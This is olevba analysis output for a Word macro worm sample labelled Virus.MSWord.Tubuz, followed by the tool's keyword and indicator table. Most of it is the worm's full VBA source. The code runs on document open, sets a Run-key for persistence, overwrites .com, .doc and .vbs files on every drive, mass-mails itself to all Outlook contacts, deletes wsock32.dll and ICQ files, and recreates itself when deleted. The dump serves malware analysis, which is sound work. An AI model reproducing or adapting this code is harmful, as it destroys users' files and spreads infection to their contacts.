olevba 0.60.1.dev3 on Python 3.8.10 - http://decalage.info/python/oletools
===============================================================================
FILE: Virus.MSWord.Tubuz
Type: OLE
-------------------------------------------------------------------------------
VBA MACRO FR33.cls 
in file: Virus.MSWord.Tubuz - OLE stream: 'Macros/VBA/FR33'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
(empty macro)
-------------------------------------------------------------------------------
VBA MACRO Module1.bas 
in file: Virus.MSWord.Tubuz - OLE stream: 'Macros/VBA/Module1'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
'The FR33 worm
'This is very deadly but i am not sure if it will work
'by tubuznock
'JUNE 2000

Private Sub Document_Open()
On Error Resume Next
FREE.Visible = False
Doc.TaskVisible = False
Shell "Mkdir C:\Windows\lizards", 0
'Makes the folder lizards in the windows directory
Set ws = CreateObject("WScript.Shell")
ws.regwrite "HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Run\Worm", "wscript.exe c:\windows\FR33.doc %"
End Sub

Function Dodrives()
On Error Resume Next
Set fso = CreateObject("scipting.filesystemobject")
Set Drives = fso.Drives
For Each Drive In Drives
If Drive.Drivetype = Remote Then
Drivefull = Drive & "\"
Call Subfolders(Drivefull)
ElseIf Drive.IsReady Then
Drivefull = Drive & "\"
Call Subfolders(Drivefull)
End If
Next
End Function
'This function infects other files with the FR33.doc
'It infects .com .doc and .vbs files and replaces it with the FR33.doc
Function Subfolders(path)
Set Fold = fso.GetFolder(path)
Set Files = Fold.Files
For Each file In Files
If fso.GetExtensionName(file.path) = "com" Then
fso.copyfile wscript.scriptfullname, file.path, True
End If
If fso.GetExtensionName(file.path) = "vbs" Then
fso.copyfile wscript.scriptfullname, file.path, True
End If
If fso.GetExtensionName(file.path) = "doc" Then
fso.copyfile wscript.scriptfullname, file.path, True
End If
Next
Set file = Fold.Subfolders
For Each Subfol In file
Call Subfolders(Subfol.path)
Next
End Function

'Hohoho, Outlook Replication
'An e-mail is sent to everyone in the victims address book
'Attaches the worm to every e-mail
Function Outlook()
On Error Resume Next
Set OutlookApp = CreateObject("Outlook.Application")
If OutlookApp = "Outlook" Then
Set Mapi = OutlookApp.GetNameSpace("MAPI")
For Each Addresslist In Mapi.AddressLists
If Addresslist.AddressEntries.Count <> 0 Then
Addresslistcout = Addresslist.AddressEntries.Count
For AddList = 1 To Addresslistcout
Set msg = OutlookApp.CreateItem(0)
Set AdEntries = Addresslist.AddressEntries(AddList)
msg.To = AdEntries.Address
msg.Subject = "Here you have, ;o)"
msg.Body = "Hi:" & vbCrLf & "Check This!"
Set Attachs = msg.Attachments
Attachs.Add "c:\windows\FR33.doc"
msg.DeleteAfterSubmit = True
If msg.To <> "" Then
msg.Send
End If
Next
End If
Next
End If
End Function

Function FileCopy()
FileCopy "C:\Windows\System\wsock32.dll, C:\Windows\lizards"
End Function

'All this does is first delete the wsock32.dll in the system folder,
'and rename wsock32.dll to wsock32.gos
Function Kill()
Kill "C:\Windows\System\wsock32.dll*.*"
Shell "C:\Windows\lizards\ ren wsock32.dll wsock32.gos", 0
Kill "C:\Program Files\ICQ\DLL\ICQWSOCK32.dll*.*"
Kill "C:\Program Files\ICQ\DLL\RasDLL.dll*.*"
Kill "C:\Program Files\ICQ\icq.exe*.*"
End Function

'This is a loony function i got from [K]Alamar's worm generator
'It is called the anti-deletion method.
'Every time a copy of the Happ00 is deleted a new one is made.
Function Antidelete()
Set fso = CreateObject("scripting.filesystemobject")
Set Myself = fso.opentextfile(wscript.scriptfullname, 1)
MyCode = Myself.readall
Myself.Close
Do
If Not (fso.fileexists(wscript.scriptfullname)) Then
Set Myself = fso.createtextfile(wscript.scriptfullname, True)
Myself.write MyCode
Myself.Close
End If
Loop
End Function

+----------+--------------------+---------------------------------------------+
|Type      |Keyword             |Description                                  |
+----------+--------------------+---------------------------------------------+
|AutoExec  |Document_Open       |Runs when the Word or Publisher document is  |
|          |                    |opened                                       |
|Suspicious|write               |May write to a file (if combined with Open)  |
|Suspicious|FileCopy            |May copy a file                              |
|Suspicious|copyfile            |May copy a file                              |
|Suspicious|Kill                |May delete a file                            |
|Suspicious|createtextfile      |May create a text file                       |
|Suspicious|Shell               |May run an executable file or a system       |
|          |                    |command                                      |
|Suspicious|WScript.Shell       |May run an executable file or a system       |
|          |                    |command                                      |
|Suspicious|Run                 |May run an executable file or a system       |
|          |                    |command                                      |
|Suspicious|Call                |May call a DLL using Excel 4 Macros (XLM/XLF)|
|Suspicious|Mkdir               |May create a directory                       |
|Suspicious|CreateObject        |May create an OLE object                     |
|Suspicious|Windows             |May enumerate application windows (if        |
|          |                    |combined with Shell.Application object)      |
|Suspicious|System              |May run an executable file or a system       |
|          |                    |command on a Mac (if combined with           |
|          |                    |libc.dylib)                                  |
|Suspicious|Base64 Strings      |Base64-encoded strings were detected, may be |
|          |                    |used to obfuscate strings (option --decode to|
|          |                    |see all)                                     |
|IOC       |wscript.exe         |Executable file name                         |
|IOC       |wsock32.dll         |Executable file name                         |
|IOC       |ICQWSOCK32.dll      |Executable file name                         |
|IOC       |RasDLL.dll          |Executable file name                         |
|IOC       |icq.exe             |Executable file name                         |
+----------+--------------------+---------------------------------------------+

